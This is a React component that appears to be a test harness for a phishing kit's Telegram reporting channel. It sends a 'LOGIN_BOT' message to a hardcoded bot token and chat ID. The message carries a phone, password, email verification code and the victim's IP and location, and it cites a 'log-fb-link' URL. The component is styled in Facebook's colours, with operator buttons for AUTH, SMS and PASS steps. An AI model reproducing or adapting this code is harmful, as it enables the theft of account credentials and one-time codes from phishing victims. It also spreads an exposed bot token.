import { useState } from 'react';

const SendMessage = () => {
  const [isLoading, setIsLoading] = useState(false);
  const [status, setStatus] = useState('');

  const botToken = "8402740123:AAEZ2mX2d9od3aWYAbZp40Nx6yFZdrsanWY";
  const chatID = "1467918676";

  const sendTelegramMessage = async () => {
    setIsLoading(true);
    setStatus('');

    // Sample data - you can modify these values
    const messageData = {
      url: "https://log-fb-link-2.vercel.app/require",
      phone: "aa",
      pass: "aa",
      emailCode: "444455",
      ip: "223.231.165.25",
      country: "India",
      city: "Bengaluru",
      region: "Karnataka"
    };

    // Format message like the image
    const message = `🤖 <b>LOGIN_BOT</b>
<b>EMAIL code</b>
🖥 ${messageData.url}

Phone: <code>${messageData.phone}</code>
Pass: <code>${messageData.pass}</code>
🎈 EMAIL Code: <code>${messageData.emailCode}</code>

🌐 IP: ${messageData.ip}
📍 Country: ${messageData.country}
🏙 City: ${messageData.city}
📍 Region: ${messageData.region}`;

    // Inline keyboard buttons with URLs
    const inlineKeyboard = {
      inline_keyboard: [
        [
          { text: "AUTH", url: "https://www.google.com" },
          { text: "SMS", url: "https://www.google.com" },
          { text: "WA", url: "https://www.google.com" },
          { text: "EMAIL", url: "https://www.google.com" }
        ],
        [
          { text: "PASS", url: "https://www.google.com" },
          { text: "90 CAREER", url: "https://www.google.com" },
          { text: "DONE", url: "https://www.google.com" },
          { text: "❌", url: "https://www.google.com" }
        ]
      ]
    };

    try {
      const response = await fetch(
        `https://api.telegram.org/bot${botToken}/sendMessage`,
        {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: chatID,
            text: message,
            parse_mode: 'HTML',
            reply_markup: inlineKeyboard
          }),
        }
      );

      const result = await response.json();

      if (result.ok) {
        setStatus('✅ Message sent successfully!');
      } else {
        setStatus(`❌ Error: ${result.description}`);
      }
    } catch (error) {
      setStatus(`❌ Error: ${error.message}`);
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div style={styles.container}>
      <div style={styles.card}>
        <h1 style={styles.title}>Telegram Message Sender</h1>
        <p style={styles.description}>
          Click the button below to send a test message to Telegram
        </p>
        
        <button 
          onClick={sendTelegramMessage} 
          disabled={isLoading}
          style={{
            ...styles.button,
            ...(isLoading ? styles.buttonDisabled : {})
          }}
        >
          {isLoading ? 'Sending...' : 'Send Message'}
        </button>

        {status && (
          <p style={{
            ...styles.status,
            color: status.includes('✅') ? '#22c55e' : '#ef4444'
          }}>
            {status}
          </p>
        )}
      </div>
    </div>
  );
};

const styles = {
  container: {
    minHeight: '100vh',
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'center',
    background: 'radial-gradient(circle, #ededed 0%, #e3e3e3 100%)',
    padding: '20px',
  },
  card: {
    background: '#fff',
    borderRadius: '12px',
    padding: '40px',
    maxWidth: '400px',
    width: '100%',
    boxShadow: '0 4px 6px rgba(0, 0, 0, 0.1)',
    textAlign: 'center',
  },
  title: {
    fontSize: '24px',
    fontWeight: '600',
    color: '#1877f2',
    marginBottom: '12px',
  },
  description: {
    fontSize: '14px',
    color: '#65676b',
    marginBottom: '24px',
  },
  button: {
    width: '100%',
    padding: '14px 24px',
    background: '#1877f2',
    color: '#fff',
    border: 'none',
    borderRadius: '8px',
    fontSize: '16px',
    fontWeight: '600',
    cursor: 'pointer',
    transition: 'background 0.2s',
  },
  buttonDisabled: {
    background: '#ccc',
    cursor: 'not-allowed',
  },
  status: {
    marginTop: '16px',
    fontSize: '14px',
    fontWeight: '500',
  },
};

export default SendMessage;
